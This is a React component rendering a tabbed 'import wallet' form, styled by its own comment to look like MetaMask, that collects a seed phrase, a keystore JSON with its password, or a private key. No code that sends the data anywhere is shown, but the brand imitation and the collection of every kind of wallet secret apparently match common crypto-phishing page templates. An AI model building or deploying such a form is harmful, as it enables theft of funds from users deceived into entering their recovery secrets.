import React, { useState } from 'react';

// Default theme (MetaMask style)
const defaultTheme = {
  bg: '#1E2329',
  text: 'white',
  border: 'gray-600',
  accent: '#ffa680',
  accentText: 'black',
  accentHover: 'orange-400',
  tabActiveBg: '#ffa680',
  tabActiveText: 'black',
  tabInactiveBg: '#1E2329',
  tabInactiveText: 'white',
  tabBorder: 'gray-600',
};

const WalletImportTabs = ({ theme = defaultTheme }) => {
  const [activeTab, setActiveTab] = useState('phrase');
  const [showPassword, setShowPassword] = useState(false);

  const tabData = [
    {
      key: 'phrase',
      label: 'Phrase',
      content: (
        <form className="flex flex-col gap-4 mt-4">
          <textarea name="key" required minLength={12} placeholder="Phrase" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 12 (sometimes 24) words separated by single spaces</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText}} className={`font-bold py-2 rounded hover:bg-${theme.accentHover} transition`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'keystore',
      label: 'Keystore JSON',
      content: (
        <form className="flex flex-col gap-4 mt-4">
          <textarea name="key" required minLength={12} placeholder="Keystore JSON" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="relative w-full">
            <input
              type={showPassword ? 'text' : 'password'}
              name="pass"
              placeholder="Password"
              required
              minLength={4}
              style={{background: theme.bg, color: theme.text}}
              className={`w-full p-2 border rounded border-${theme.border} focus:ring-2 pr-10`}
            />
            <button
              type="button"
              style={{color: theme.text === '#fff' ? '#1976d2' : theme.accent}}
              className={`absolute right-2 top-2 text-sm font-bold focus:outline-none`}
              onClick={() => setShowPassword((prev) => !prev)}
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          <div className="desc text-sm text-gray-400">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText}} className={`font-bold py-2 rounded hover:bg-${theme.accentHover} transition`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'private',
      label: 'Private Key',
      content: (
        <form className="flex flex-col gap-4 mt-4">
          <input type="text" name="key" placeholder="Private Key" required minLength={64} style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 64 alphanumeric characters</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText}} className={`font-bold py-2 rounded hover:bg-${theme.accentHover} transition`}>IMPORT</button>
        </form>
      )
    }
  ];

  return (
    <div>
      <div className="flex gap-2 mb-2">
        {tabData.map(tab => (
          <button
            key={tab.key}
            style={activeTab === tab.key ? {background: theme.tabActiveBg, color: theme.tabActiveText} : {background: theme.tabInactiveBg, color: theme.tabInactiveText, borderColor: theme.tabBorder}}
            className={`px-4 py-2 rounded font-bold text-sm border`}
            onClick={() => setActiveTab(tab.key)}
          >
            {tab.label}
          </button>
        ))}
      </div>
      <div>{tabData.find(tab => tab.key === activeTab)?.content}</div>
    </div>
  );
};

export default WalletImportTabs;